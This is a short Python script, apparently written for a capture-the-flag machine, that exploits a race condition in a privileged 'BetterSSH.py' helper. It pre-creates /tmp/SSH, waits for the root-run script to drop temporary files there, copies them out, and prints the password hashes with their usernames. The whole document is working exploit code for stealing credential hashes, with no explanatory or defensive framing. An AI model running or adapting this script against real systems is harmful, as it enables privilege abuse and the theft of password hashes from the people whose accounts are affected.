
import subprocess, threading, os

def SnatchHash():
    while not os.listdir("/tmp/SSH"): # Checking if the directory is still empty or not
        pass
    os.system("cat /tmp/SSH/* > /home/robert/hashes.txt") # Snatching the hash

if not os.path.isdir("/tmp/SSH"): # sometime the system doesn't have any default /tmp/SSH but since /tmp gives you full access, you can always create one
    os.mkdir("/tmp/SSH")

threading.Thread(target=SnatchHash).start()                                             # Starting the thread
subprocess.call("sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py",shell=True) # Calling the script

with open("/home/robert/hashes.txt") as fileob: # Access the hashes.txt file
    lines = fileob.readlines()
    hashes = '----- SNATCHED HASHES -----\n'
    for index, i in enumerate(lines):
        if i[0]=='$':
            hashes+=lines[index-1]+i
    hashes += '\n----- SNATCHED HASHES -----'
    print(hashes)
